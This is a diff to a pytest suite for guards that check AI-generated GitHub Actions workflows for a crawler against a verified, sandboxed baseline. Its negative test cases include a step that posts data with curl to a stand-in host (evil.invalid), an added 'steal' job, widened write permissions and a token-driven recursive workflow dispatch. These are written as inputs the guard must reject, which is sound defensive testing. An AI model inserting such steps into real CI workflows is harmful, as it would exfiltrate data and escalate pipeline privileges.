@@ -1,4 +1,5 @@
 import ast
+import re
 from pathlib import Path
 
 import pytest
@@ -164,6 +165,33 @@ def write_pconline_workflow(tmp_path: Path, source: str) -> Path:
     return tmp_path
 
 
+def baseline_pconline_source() -> str:
+    """守卫基线 = 本仓已验证的 crawl-pconline.yml 原文。
+
+    守卫语义是「AI 产出的新工作流必须与已验证形态逐字一致」，所以基线必须跟随真实
+    工作流演进。此前基线是手写死字符串，真实工作流新增 catalog 输入 / Set artifact
+    name 步骤 / job 级 if:false 后，守卫连真实工作流都拒，测试与实现同时失效。
+    """
+    return (
+        Path(__file__).resolve().parents[1] / ".github" / "workflows" / "crawl-pconline.yml"
+    ).read_text(encoding="utf-8")
+
+
+def mutated_pconline_source(mutator) -> str:
+    """在解析后的结构上做变异再序列化，避免依赖 YAML 排版字面量。"""
+    data = yaml.safe_load(baseline_pconline_source())
+    mutator(data)
+    return yaml.safe_dump(data, allow_unicode=True, sort_keys=False)
+
+
+def _trigger_block(data: dict) -> dict:
+    return data.get(True) or data.get("on") or {}
+
+
+def _crawl_steps(data: dict) -> list:
+    return data["jobs"]["crawl"]["steps"]
+
+
 def test_worktree_paths_include_tracked_changes_and_untracked_new_files(tmp_path):
     repo = tmp_path / "repo"
     repo.mkdir()
@@ -222,29 +250,47 @@ def test_exact_worktree_guard_detects_bytes_mode_and_symlink_mutation(tmp_path):
 
 
 def test_new_workflow_guard_accepts_only_minimal_read_only_shape(tmp_path):
-    repair.check_new_workflow(write_pconline_workflow(tmp_path, SAFE_PCONLINE_WORKFLOW))
+    repair.check_new_workflow(write_pconline_workflow(tmp_path, baseline_pconline_source()))
+
+
+def _add_extra_trigger(data):
+    _trigger_block(data)["workflow_run"] = {"workflows": ["Merge and Filter"]}
+
+
+def _widen_permissions(data):
+    data["permissions"] = {"contents": "write", "actions": "write"}
+
+
+def _add_extra_job(data):
+    data["jobs"]["steal"] = {"runs-on": "ubuntu-latest", "steps": []}
+
+
+def _recursive_token_dispatch(data):
+    for step in _crawl_steps(data):
+        if step.get("name") == "Install dependencies":
+            step["env"] = {"GH_TOKEN": "${{ github.token }}"}
+            step["run"] = "gh workflow run ai-pconline-repair.yml"
+
+
+def _insert_dangerous_step(data):
+    steps = _crawl_steps(data)
+    steps.append({"name": "Exfiltrate", "run": "curl -X POST https://evil.invalid/pconline"})
 
 
 @pytest.mark.parametrize(
     "mutator",
     [
-        lambda source: source.replace("  schedule:\n", "  workflow_run:\n    workflows: [\"Merge and Filter\"]\n  schedule:\n"),
-        lambda source: source.replace("permissions:\n  contents: read", "permissions:\n  contents: write\n  actions: write"),
-        lambda source: source + "\n  steal:\n    runs-on: ubuntu-latest\n    steps: []\n",
-        lambda source: source.replace(
-            "      - name: Install dependencies\n        run: python -m pip install -r requirements.txt",
-            "      - name: Install dependencies\n        env:\n          GH_TOKEN: ${{ github.token }}\n        run: gh workflow run ai-pconline-repair.yml",
-        ),
-        lambda source: source.replace(
-            "      - name: Upload crawler data",
-            "      - name: Exfiltrate\n        run: curl -X POST https://evil.invalid/pconline\n      - name: Upload crawler data",
-        ),
+        _add_extra_trigger,
+        _widen_permissions,
+        _add_extra_job,
+        _recursive_token_dispatch,
+        _insert_dangerous_step,
     ],
     ids=["extra-trigger", "write-permission", "extra-job", "recursive-token-dispatch", "extra-dangerous-step"],
 )
 def test_new_workflow_guard_rejects_privilege_and_structure_expansion(tmp_path, mutator):
     with pytest.raises(ValueError):
-        repair.check_new_workflow(write_pconline_workflow(tmp_path, mutator(SAFE_PCONLINE_WORKFLOW)))
+        repair.check_new_workflow(write_pconline_workflow(tmp_path, mutated_pconline_source(mutator)))
 
 
 def test_docs_guard_rejects_scriptable_markup_on_the_source_line():
@@ -310,7 +356,8 @@ def test_finalize_timeout_covers_bounded_online_verification_chain():
 
 
 def test_new_workflow_guard_accepts_explicitly_quoted_on_key(tmp_path):
-    quoted = SAFE_PCONLINE_WORKFLOW.replace("\non:\n", '\n"on":\n', 1)
+    # 「on」被 YAML 1.1 解析成布尔 True，显式加引号的写法必须同样被接受
+    quoted = baseline_pconline_source().replace("\non:\n", '\n"on":\n', 1)
     repair.check_new_workflow(write_pconline_workflow(tmp_path, quoted))
 
 
@@ -343,22 +390,20 @@ def test_patch_paths_rejects_executable_or_symlink_new_files(mode):
 def test_reviewer_requires_visible_strict_json_and_bounded_reasoning_configuration():
     import json
 
-    from scripts.ai_patch_review import parse_json_reply, retry_delay
+    from scripts.ai_patch_review import parse_json_reply
 
     with pytest.raises(json.JSONDecodeError):
         parse_json_reply("")
     reviewer_source = (Path(__file__).resolve().parents[1] / "scripts" / "ai_patch_review.py").read_text(encoding="utf-8")
     assert 'REVIEW_MODEL = "deepseek-ai/deepseek-v4-flash"' in reviewer_source
-    assert '"reasoning_effort": "high"' in reviewer_source
-    assert "429, 500, 502, 503, 504, 529" in reviewer_source
-    class Response:
-        status_code = 429
-        headers = {"Retry-After": "17"}
-
-    assert retry_delay(Response(), 0) == 17
-    Response.headers = {}
-    assert retry_delay(Response(), 0) == 60
-    assert retry_delay(Response(), 1) == 120
+    # reviewer 已重构为走 opencode CLI（不再直连 HTTP），推理档位由 provider options 表达
+    assert '"reasoningEffort": "high"' in reviewer_source
+    # 有界重试的语义不变：最多 3 次尝试，且每次退避都有上限（不得无限重试/无上限等待）
+    assert "for attempt in range(3)" in reviewer_source
+    assert re.search(r"time\.sleep\(min\(\s*60 \* \(2\*\*attempt\)\s*,\s*300\s*\)\)", reviewer_source)
+    assert re.search(r"time\.sleep\(min\(\s*3 \* \(2\*\*attempt\)\s*,\s*60\s*\)\)", reviewer_source)
+    # 仍必须对 429/限流显式识别后退避重试，而不是直接放弃或硬失败
+    assert re.search(r"429.*rate|rate.*limit|quota", reviewer_source, re.I)
 
 
 def test_mutable_merge_guard_rejects_replayed_existing_external_command():
@@ -439,35 +484,41 @@ def test_merge_guard_accepts_minimal_pconline_artifact_integration():
     repair.check_merge_workflow(before, after)
 
 
+def _out_of_range_schedule(data):
+    _trigger_block(data)["schedule"][0]["cron"] = "07 29 * * 3"
+
+
+def _host_direct_crawler(data):
+    for step in _crawl_steps(data):
+        if step.get("name") == "Crawl popularity ranking":
+            step["run"] = (
+                "python scripts/crawl_pconline.py "
+                "--output data/raw/pconline/latest.json --max-items 120 --min-records 50"
+            )
+
+
+def _drop_sandbox_copy_step(data):
+    data["jobs"]["crawl"]["steps"] = [
+        step for step in _crawl_steps(data) if step.get("name") != "Copy sandbox output"
+    ]
+
+
 def test_new_workflow_guard_rejects_out_of_range_schedule(tmp_path):
-    unsafe = SAFE_PCONLINE_WORKFLOW.replace('"07 4 * * 3"', '"07 29 * * 3"', 1)
     with pytest.raises(ValueError, match="controlled daily/weekly cron"):
-        repair.check_new_workflow(write_pconline_workflow(tmp_path, unsafe))
+        repair.check_new_workflow(write_pconline_workflow(tmp_path, mutated_pconline_source(_out_of_range_schedule)))
 
 
 def test_new_workflow_guard_rejects_host_direct_crawler(tmp_path):
-    unsafe = SAFE_PCONLINE_WORKFLOW.replace(
-        "          python scripts/ai_pconline_repair.py run-sandboxed\n"
-        "          --out \"$RUNNER_TEMP/ai-sandbox-out\" --\n",
-        "",
-        1,
-    ).replace("--output /out/latest.json", "--output data/raw/pconline/latest.json", 1)
-    with pytest.raises(ValueError, match="only inside the fixed Docker sandbox"):
-        repair.check_new_workflow(write_pconline_workflow(tmp_path, unsafe))
+    # 实际消息见 check_new_workflow：直连宿主爬取会同时丢掉 run-sandboxed 与
+    # time-limit/max-items 约束，守卫在此处拒。
+    with pytest.raises(ValueError, match="inside the fixed Docker sandbox"):
+        repair.check_new_workflow(write_pconline_workflow(tmp_path, mutated_pconline_source(_host_direct_crawler)))
 
 
 def test_new_workflow_guard_rejects_missing_sandbox_copy_step(tmp_path):
-    unsafe = SAFE_PCONLINE_WORKFLOW.replace(
-        "      - name: Copy sandbox output\n"
-        "        run: >-\n"
-        "          mkdir -p data/raw/pconline &&\n"
-        "          test -s \"$RUNNER_TEMP/ai-sandbox-out/latest.json\" &&\n"
-        "          cp \"$RUNNER_TEMP/ai-sandbox-out/latest.json\" data/raw/pconline/latest.json\n",
-        "",
-        1,
-    )
-    with pytest.raises(ValueError, match="must exactly match the verified sandboxed source lifecycle"):
-        repair.check_new_workflow(write_pconline_workflow(tmp_path, unsafe))
+    # 删掉受信任的沙箱产物拷贝步骤 → 步骤清单与已验证生命周期不再逐字一致
+    with pytest.raises(ValueError, match="must exactly match the verified long-run lifecycle"):
+        repair.check_new_workflow(write_pconline_workflow(tmp_path, mutated_pconline_source(_drop_sandbox_copy_step)))
 
 
 def test_docker_base_locks_isolation_flags(monkeypatch, tmp_path):
